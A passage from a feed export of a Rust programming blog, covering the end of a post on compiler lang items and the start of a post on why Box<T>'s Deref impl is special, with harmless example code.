</span><span class='line'><span class="k">trait</span> <span class="n">MyAdd</span><span class="o">&lt;</span><span class="n">RHS</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Output</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="o">:</span> <span class="n">RHS</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Self</span><span class="o">::</span><span class="n">Output</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span> <span class="n">MyAdd</span><span class="o">&lt;</span><span class="n">isize</span><span class="o">&gt;</span> <span class="k">for</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Output</span> <span class="o">=</span> <span class="n">isize</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="o">:</span> <span class="n">isize</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>        <span class="bp">self</span> <span class="o">+</span> <span class="n">other</span> <span class="o">+</span> <span class="mi">50</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span><span class="p">;</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;start&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">fn</span> <span class="n">start</span><span class="p">(</span><span class="n">_main</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">,</span> <span class="n">_argc</span><span class="o">:</span> <span class="n">isize</span><span class="p">,</span> <span class="n">_argv</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="mi">40</span> <span class="o">+</span> <span class="mi">2</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will need to be compiled with <code>-C opt-level=2</code>, since numeric addition in debug mode panics on
wrap and we haven&rsquo;t defined the <code>"panic"</code> lang item to teach the compiler <em>how</em> to panic.</p>

<p>It will exit with 42, not 92, since while the <code>Add</code> implementation is required for this to type
check, it doesn&rsquo;t actually get used.</p>

<hr />

<p>So what lang items <em>are</em> there, and why are they lang items? There&rsquo;s a <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L252-L363">big list</a> in the
compiler. Let&rsquo;s go through them:</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L254-L272"><code>ImplItem</code> ones</a> (<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libstd_unicode/char.rs#L134-L135">core</a>) are used to mark implementations on
primitive types. <code>char</code> has some methods, and <em>someone</em> has to say <code>impl char</code> to define them. But
coherence only allows us to impl methods on types defined in our own crate, and <code>char</code> isn&rsquo;t defined
&hellip; in any crate, so how do we add methods to it? <code>#[lang = "char"]</code> provides an escape hatch;
applying that to <code>impl char</code> will allow you to break the coherence rules and add methods,
<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libstd_unicode/char.rs#L134-L135">as is done in the standard library</a>. Since lang items can only be defined once, only
a single crate gets the honor of adding methods to <code>char</code>, so we don&rsquo;t have any of the issues that
arise from sidestepping coherence.</p>

<p>There are a bunch for the <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L274-L278">marker traits</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/marker.rs#L41-L356">core</a>):</p>

<ul>
<li><code>Send</code> is a lang item because you are allowed to use it in a <code>+</code> bound in a trait object (<code>Box&lt;SomeTrait+Send+Sync&gt;</code>), and the compiler caches it aggressively</li>
<li><code>Sync</code> is a lang item for the same reasons as <code>Send</code>, but also because the compiler needs to enforce its implementation on types used in statics</li>
<li><code>Copy</code> is fundamental to classifying values and reasoning about moves/etc, so it needs to be a lang item</li>
<li><code>Sized</code> is also fundamental to reasoning about which values may exist on the stack. It is also magically included as a bound on generic parameters unless excluded with <code>?Sized</code></li>
<li><a href="https://doc.rust-lang.org/nightly/std/marker/trait.Unsize.html"><code>Unsize</code></a> is implemented automatically on types using a specific set of rules (<a href="https://doc.rust-lang.org/nomicon/coercions.html">listed in the nomicon</a>). Unlike <code>Send</code> and <code>Sync</code>, this mechanism for autoimplementation is tailored for the use case of <code>Unsize</code> and can&rsquo;t be reused on user-defined marker traits.</li>
</ul>


<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L280"><code>Drop</code> is a lang item</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L174-L197">core</a>) because the compiler needs to know which types have destructors, and how to call
these destructors.</p>

<p><a href="https://doc.rust-lang.org/nightly/std/ops/trait.CoerceUnsized.html"><code>CoerceUnsized</code></a> <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L282">is a lang item</a>
(<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L2743-L2746">core</a>) because the compiler is allowed to perform
<a href="https://github.com/rust-lang/rfcs/blob/master/text/0982-dst-coercion.md">DST coercions</a> (<a href="https://doc.rust-lang.org/nomicon/coercions.html">nomicon</a>) when it is implemented.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L284-L307">All of the builtin operators</a> (also <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L311-L312"><code>Deref</code></a>
and <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L318-L319"><code>PartialEq</code>/<code>PartialOrd</code></a>, which are listed later in the file) (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L243-L2035">core</a>)
are lang items because the compiler needs to know what trait to require (and call)
when it comes across such an operation.</p>

<p><a href="http://doc.rust-lang.org/std/cell/struct.UnsafeCell.html"><code>UnsafeCell</code></a> <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L309">is a lang item</a>
(<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/cell.rs#L1065-L1069">core</a>) because it has very special semantics; it prevents
certain optimizations. Specifically, Rust is allowed to reorder reads/writes to <code>&amp;mut foo</code> with the
assumption that the local variable holding the reference is the only alias allowed to read from
or write to the data, and it is allowed to reorder reads from <code>&amp;foo</code> assuming that no other alias
writes to it. We tell LLVM that these types are <code>noalias</code>. <code>UnsafeCell&lt;T&gt;</code> turns this optimization
off, allowing writes to <code>&amp;UnsafeCell&lt;T&gt;</code> references. This is used in the implementation of interior
mutability types like <code>Cell&lt;T&gt;</code>, <code>RefCell&lt;T&gt;</code>, and <code>Mutex&lt;T&gt;</code>.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L314-L316"><code>Fn</code> traits</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L2556-L2659">core</a>) are used in dispatching function calls,
and can be specified with special syntax sugar, so they need to be lang items. They also
get autoimplemented on closures.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L321">The <code>"str_eq"</code> lang item</a> is outdated. It <em>used</em> to specify how to check the equality
of a string value against a literal string pattern in a <code>match</code> (<code>match</code> uses structural equality,
not <code>PartialEq::eq</code>), however I believe this behavior is now hardcoded in the compiler.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L332-L334">The panic-related lang items</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/panicking.rs#L39-L58">core</a>) exist because rustc itself
inserts panics in a few places. The first one, <code>"panic"</code>, is used for integer overflow panics in debug mode, and
<code>"panic_bounds_check"</code> is used for out of bounds indexing panics on slices. The last one,
<code>"panic_fmt"</code> hooks into a function defined later in libstd.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L336-L337"><code>"exchange_malloc"</code> and <code>"box_free"</code></a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/liballoc/heap.rs#L129-L152">alloc</a>) are for
telling the compiler which functions to call in case it needs to do a <code>malloc()</code> or <code>free()</code>. These
are used when constructing <code>Box&lt;T&gt;</code> via placement <code>box</code> syntax and when moving out of a deref of a
box.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L338"><code>"strdup_uniq"</code></a> seemed to be used in the past for moving string literals to the heap,
but is no longer used.</p>

<p>We&rsquo;ve already seen <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L340">the start lang item</a> (<a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/libstd/rt.rs#L31-L67">std</a>) being used in our
minimal example program. This function is basically where you find Rust&rsquo;s &ldquo;runtime&rdquo;: it gets called
with a pointer to main and the command line arguments, it sets up the &ldquo;runtime&rdquo;, calls main, and
tears down anything it needs to. Rust has a C-like minimal runtime, so
<a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/libstd/rt.rs#L31-L67">the actual libstd definition</a> doesn&rsquo;t do much.
But you theoretically could stick a very heavy runtime initialization routine here.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L342-L344">exception handling lang items</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libpanic_unwind/seh.rs">panic_unwind</a>, in multiple
platform-specific modules) specify various bits of the exception handling behavior. These hooks are
called during various steps of unwinding: <code>eh_personality</code> is called when determining whether
or not to stop at a stack frame or unwind up to the next one. <code>eh_unwind_resume</code> is the routine
called when the unwinding code wishes to resume unwinding after calling destructors in a landing
pad. <code>msvc_try_filter</code> defines some parameter that MSVC needs in its unwinding code. I don&rsquo;t
understand it, and apparently, <a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libpanic_unwind/seh.rs#L232">neither does the person who wrote it</a>.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L346"><code>"owned_box"</code></a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/liballoc/boxed.rs#L105-L107">alloc</a>) lang item tells the compiler which type is
the <code>Box</code> type. In my previous post I covered how <code>Box</code> is special; this lang item is how the
compiler finds impls on <code>Box</code> and knows what the type is. Unlike the other primitives, <code>Box</code> doesn&rsquo;t
actually have a type name (like <code>bool</code>) that can be used if you&rsquo;re writing libcore or libstd. This
lang item gives <code>Box</code> a type name that can be used to refer to it. (It also defines some,
but not all, of the semantics of <code>Box&lt;T&gt;</code>)</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L348"><code>"phantom_data"</code></a> (<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/marker.rs#L544-L546">core</a>) type itself is allowed to have
an unused type parameter, and it can be used to help fix the variance and drop behavior
of a generic type. More on this in <a href="https://doc.rust-lang.org/nomicon/phantom-data.html">the nomicon</a>.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L360"><code>"non_zero"</code></a> lang item (<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/nonzero.rs#L38-L42">core</a>) marks the <code>NonZero&lt;T&gt;</code> type,
a type which is guaranteed to never contain a bit pattern of only zeroes. This is used inside things
like <code>Rc&lt;T&gt;</code> and <code>Box&lt;T&gt;</code> &ndash; we know that the pointers in these can/should never be null, so they
contain a <code>NonZero&lt;*const T&gt;</code>. When used inside an enum like <code>Option&lt;Rc&lt;T&gt;&gt;</code>, the discriminant
(the &ldquo;tag&rdquo; value that distinguishes between <code>Some</code> and <code>None</code>) is no longer necessary, since
we can mark the <code>None</code> case as the case where the bits occupied by <code>NonZero</code> in the <code>Some</code> case
are zero. Beware, this optimization also applies to C-like enums that don&rsquo;t have a variant
corresponding to a discriminant value of zero (unless they are <code>#[repr(C)]</code>)</p>

<p>There are also a bunch of deprecated lang items there. For example, <code>NoCopy</code> used to be a struct
that could be dropped within a type to make it not implement <code>Copy</code>; in the past <code>Copy</code>
implementations were automatic like <code>Send</code> and <code>Sync</code> are today. <code>NoCopy</code> was the way to opt out.
There also used to be <code>NoSend</code> and <code>NoSync</code>. <code>CovariantType</code>/<code>CovariantLifetime</code>/etc were the
predecessors of <code>PhantomData</code>; they could be used to specify variance relations of a type with its
type or lifetime parameters, but you can now do this with providing the right <code>PhantomData</code>, e.g.
<code>InvariantType&lt;T&gt;</code> is now <code>PhantomData&lt;Cell&lt;T&gt;&gt;</code>.
The <a href="https://doc.rust-lang.org/nomicon/subtyping.html">nomicon</a> has more on variance. I don&rsquo;t know why these lang items haven&rsquo;t been
removed (they don&rsquo;t work anymore anyway); the only consumer of them is libcore so &ldquo;deprecating&rdquo; them
seems unnecessary. It&rsquo;s probably an oversight.</p>

<p>Interestingly, <code>Iterator</code> and <code>IntoIterator</code> are <em>not</em> lang items, even though they are used in <code>for</code>
loops. Instead, the compiler inserts hardcoded calls to <code>::std::iter::IntoIterator::into_iter</code> and
<code>::std::iter::Iterator::next</code>, and a hardcoded reference to <code>::std::option::Option</code> (The paths use
<code>core</code> in <code>no_std</code> mode). This is probably because the compiler desugars <code>for</code> loops before type
resolution is done, so withut this, libcore would not be able to use for loops since the compiler
wouldn&rsquo;t know what calls to insert in place of the loops while compiling.</p>

<hr />

<p>Basically, whenever the compiler needs to use special treatment with an item &ndash; whether it be
dispatching calls to functions and trait methods in various situations, conferring special semantics
to types/traits, or requiring traits to be implemented, the type will be defined in the standard
library (libstd, libcore, or one of the crates behind the libstd façade), and marked as a lang item.</p>

<p>Some of the lang items are useful/necessary when working without libstd. Most only come into play if
you want to replace libcore, which is a pretty niche thing to do, and knowing about them is rarely
useful outside of the realm of compiler hacking.</p>

<p>But, like with the <code>Box&lt;T&gt;</code> madness, I still find this quite interesting, even if it isn&rsquo;t generally
useful!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Though as we learned in the previous post, when <code>x</code> and <code>y</code> are known numeric types it will bypass the trait and directly generate an add instruction in LLVM<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>To be clear, I&rsquo;m not aware of any plans to eventually stabilize this. It&rsquo;s something that could happen.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Rust Tidbits: Box Is Special]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/01/10/rust-tidbits-box-is-special/"/>
    <updated>2017-01-10T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/01/10/rust-tidbits-box-is-special</id>
    <content type="html"><![CDATA[<p>Rust is not a simple language. As with any such language, it has many little tidbits of complexity
that most folks aren&rsquo;t aware of. Many of these tidbits are ones which may not practically matter
much for everyday Rust programming, but are interesting to know. Others may be more useful. I&rsquo;ve
found that a lot of these aren&rsquo;t documented anywhere (not that they always should be), and sometimes
depend on knowledge of compiler internals or history. As a fan of programming trivia myself, I&rsquo;ve
decided to try writing about these things whenever I come across them. &ldquo;Tribal Knowledge&rdquo; shouldn&rsquo;t
be a thing in a programming community; and trivia is fun!</p>

<hr />

<p>So. <code>Box&lt;T&gt;</code>. Your favorite heap allocation type that nobody uses<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.</p>

<p>I was discussing some stuff on the rfcs repo when
<a href="https://github.com/rust-lang/rfcs/issues/1850#issuecomment-271766300">@burdges realized that <code>Box&lt;T&gt;</code> has a funky <code>Deref</code> impl</a>.</p>

<p>Let&rsquo;s <a href="https://github.com/rust-lang/rust/blob/e4fee525e04838dabc82beed5ae1a06051be53fd/src/liballoc/boxed.rs#L502">look at it</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="cp">#[stable(feature = </span><span class="s">&quot;rust1&quot;</span><span class="cp">, since = </span><span class="s">&quot;1.0.0&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="o">?</span><span class="nb">Sized</span><span class="o">&gt;</span> <span class="n">Deref</span> <span class="k">for</span> <span class="n">Box</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Target</span> <span class="o">=</span> <span class="n">T</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">fn</span> <span class="n">deref</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="n">T</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;**</span><span class="bp">self</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#[stable(feature = </span><span class="s">&quot;rust1&quot;</span><span class="cp">, since = </span><span class="s">&quot;1.0.0&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="o">?</span><span class="nb">Sized</span><span class="o">&gt;</span> <span class="n">DerefMut</span> <span class="k">for</span> <span class="n">Box</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">deref_mut</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">T</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;</span><span class="k">mut</span> <span class="o">**</span><span class="bp">self</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Wait, what? <em>Squints</em></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">deref</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="n">T</span> <span class="p">{</span>
</span><span class='line'>    <span class="o">&amp;**</span><span class="bp">self</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>The call is coming from inside the house!</em></p>

<p>In case you didn&rsquo;t realize it, this deref impl returns <code>&amp;**self</code> &ndash; since <code>self</code>
is an <code>&amp;Box&lt;T&gt;</code>, dereferencing it once will provide a <code>Box&lt;T&gt;</code>, and the second dereference
will dereference the box to provide a <code>T</code>. We then wrap it in a reference and return it.</p>

<p>But wait, we are <em>defining</em> how a <code>Box&lt;T&gt;</code> is to be dereferenced (that&rsquo;s what <code>Deref::deref</code> is
for!), such a definition cannot itself dereference a <code>Box&lt;T&gt;</code>! That&rsquo;s infinite recursion.</p>

<p>And indeed. For any other type such a <code>deref</code> impl would recurse infinitely. If you run
<a href="https://play.rust-lang.org/?gist=9c8a02336c6816e57c83de39c103ca06&amp;version=stable&amp;backtrace=0">this code</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">use</span> <span class="n">std</span><span class="o">::</span><span class="n">ops</span><span class="o">::</span><span class="n">Deref</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">LolBox</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="p">(</span><span class="n">T</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">Deref</span> <span class="k">for</span> <span class="n">LolBox</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Target</span> <span class="o">=</span> <span class="n">T</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">deref</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="n">T</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">&amp;**</span><span class="bp">self</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>the compiler will warn you:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>warning: function cannot return without recurring, #[warn(unconditional_recursion)] on by default
</span><span class='line'> --&gt; &lt;anon&gt;:7:5
</span><span class='line'>  |
</span><span class='line'>7 |     fn deref(&amp;self) -&gt; &amp;T {
</span><span class='line'>  |     ^
</span><span class='line'>  |
</span><span class='line'>note: recursive call site
</span><span class='line'> --&gt; &lt;anon&gt;:8:10
</span><span class='line'>  |
</span><span class='line'>8 |         &amp;**self
</span><span class='line'>  |          ^^^^^^
</span><span class='line'>  = help: a `loop` may express intention better if this is on purpose
</span></code></pre></td></tr></table></div></figure>


<p>Actually trying to dereference the type will lead to a stack overflow.</p>

<p>Clearly something is fishy here. This deref impl is similar to <a href="https://github.com/rust-lang/rust/blob/52c03d1d619fd25c961bc9de59bcc942b660d5db/src/libcore/ops.rs#L2460">the deref impl for <code>&amp;T</code></a>,
or the <a href="https://github.com/rust-lang/rust/blob/52c03d1d619fd25c961bc9de59bcc942b660d5db/src/libcore/ops.rs#L263"><code>Add</code> impl for number types</a>, or any other of the implementations of operators on
primitive types. For example we literally
<a href="https://github.com/rust-lang/rust/blob/52c03d1d619fd25c961bc9de59bcc942b660d5db/src/libcore/ops.rs#L263">define <code>Add</code> on two integers to be their addition</a>. The reason these impls need to exist
is so that people can still call <code>Add::add</code> if they need to in generic code and be able to pass
integers to things with an <code>Add</code> bound. But the compiler knows how to use builtin operators on
numbers and dereference borrowed references without these impls. But those are primitive types
which are defined in the compiler, while <code>Box&lt;T&gt;</code> is just a regular smart pointer struct, right?</p>

<p>Turns out, <code>Box&lt;T&gt;</code> is special. It, too, is somewhat of a primitive type.</p>

<p>This is partly due to historical accident.</p>

<p>To understand this, we must look back to Ye Olde days of pre-1.0 Rust (ca 2014). Back in these days,
we had none of this newfangled &ldquo;stability&rdquo; business. The compiler broke your code every two weeks.
Of course, you wouldn&rsquo;t <em>know</em> that because the compiler would usually crash before it could tell
you that your code was broken! Sigils roamed the lands freely, and cargo was but a newborn child
which was destined to eventually end the tyranny of Makefiles. People were largely happy knowing
that their closures were safely boxed and their threads sufficiently green.</p>

<p>Back in these days, we didn&rsquo;t have <code>Box&lt;T&gt;</code>, <code>Vec&lt;T&gt;</code>, or <code>String</code>. We had <code>~T</code>, <code>~[T]</code>, and <code>~str</code>.
The second two are <em>not</em> equivalent to <code>Box&lt;[T]&gt;</code> and <code>Box&lt;str&gt;</code>, even though they may look like it,
they are both growable containers like <code>Vec&lt;T&gt;</code> and <code>String</code>. <code>~</code> conceptually meant &ldquo;owned&rdquo;, though
IMO that caused more confusion than it was worth.</p>

<p>You created a box using the <code>~</code> operator, e.g. <code>let x = ~1;</code>. It could be dereferenced with the <code>*</code>
operator, and autoderef worked much like it does today.</p>

<p>As a &ldquo;primitive&rdquo; type; like all primitive types, <code>~T</code> was special. The compiler knew things about
it. The compiler knew how to dereference it without an explicit <code>Deref</code> impl. In fact, the <code>Deref</code>
traits <a href="https://github.com/rust-lang/rust/pull/12491">came into existence</a> much after <code>~T</code> did. <code>~T</code> never got an explicit <code>Deref</code> impl,
though it probably should have.</p>

<p>Eventually, there was a move to remove sigils from the language. The box constructor <code>~foo</code> was
superseded by <a href="https://github.com/rust-lang/rust/pull/11055/">placement <code>box</code> syntax</a>, which still exists in Rust nightly<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. Then, the
<a href="https://github.com/rust-lang/rust/pull/13904"><code>~T</code> type became <code>Box&lt;T&gt;</code></a>. (<code>~[T]</code> and <code>~str</code> would also be removed, though <code>~str</code> took
a very confusing detour with <code>StrBuf</code> first).</p>

<p>However, <code>Box&lt;T&gt;</code> was still special. It no longer needed special syntax to be referred to or
constructed, but it was still internally a special type. It didn&rsquo;t even have a <code>Deref</code> impl yet,
that came <a href="https://github.com/rust-lang/rust/pull/20052">six months later</a>, and it was implemented as <code>&amp;**self</code>, exactly the same
as it is today.</p>

<p>But why does it <em>have</em> to be special now? Rust had all the features it needed (allocations,
ownership, overloadable deref) to implement <code>Box&lt;T&gt;</code> in pure rust in the stdlib as if it
were a regular type.</p>

<p>Turns out that Rust didn&rsquo;t. You see, because <code>Box&lt;T&gt;</code> and before it <code>~T</code> were special, their
dereference semantics were implemented in a different part of the code. And, these semantics were
not the same as the ones for <code>DerefImm</code> and <code>DerefMut</code>, which were created for use with other smart
pointers. I don&rsquo;t know if the possibility of being used for <code>~T</code> was considered when
<code>DerefImm</code>/<code>DerefMut</code> were being implemented, or if it was a simple oversight, but <code>Box&lt;T&gt;</code> has
three pieces of behavior that could not be replicated in pure Rust at the time:</p>

<ul>
<li><code>box foo</code> in a pattern would destructure a box into its contents. It&rsquo;s somewhat the opposite of <code>ref</code></li>
<li><code>box foo()</code> performed placement box, so the result of <code>foo()</code> could be directly written to a preallocated box, reducing extraneous copies</li>
<li>You could <em>move out of deref</em> with <code>Box&lt;T&gt;</code></li>
</ul>


<p>The third one is the one that really gets to us here<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>.
For a <em>regular</em> type, <code>*foo</code> will produce a temporary that must be immediately borrowed or copied.
You cannot do <code>let x = *y</code> for a non-<code>Copy</code> type. This dereference operation will call
<code>DerefMut::deref_mut</code> or <code>Deref::deref</code> based on how it gets borrowed. With <code>Box&lt;T&gt;</code>, you can do
this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Box</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]);</span>
